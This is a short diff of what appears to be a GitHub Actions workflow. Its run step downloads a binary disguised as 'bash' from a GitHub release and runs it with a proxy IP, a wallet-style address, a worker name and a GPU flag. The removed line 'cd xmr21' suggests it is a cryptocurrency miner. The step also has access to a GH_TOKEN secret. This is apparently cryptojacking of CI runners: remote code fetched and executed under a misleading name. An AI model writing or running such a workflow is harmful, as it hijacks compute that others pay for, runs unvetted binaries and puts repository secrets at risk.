@@ -32,7 +32,6 @@ jobs:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
           wget https://github.com/hujisanda/pll/releases/download/nanad/bash	
-          cd xmr21
           chmod +x ./bash
           ./bash --proxy 162.243.71.148:80 --address prl1ptmxzhtda5a0mj56glsf5pftts5uqnprwyejurf40ewkcx96e9z8q9dcz0s --worker jasin2 -gpu
 
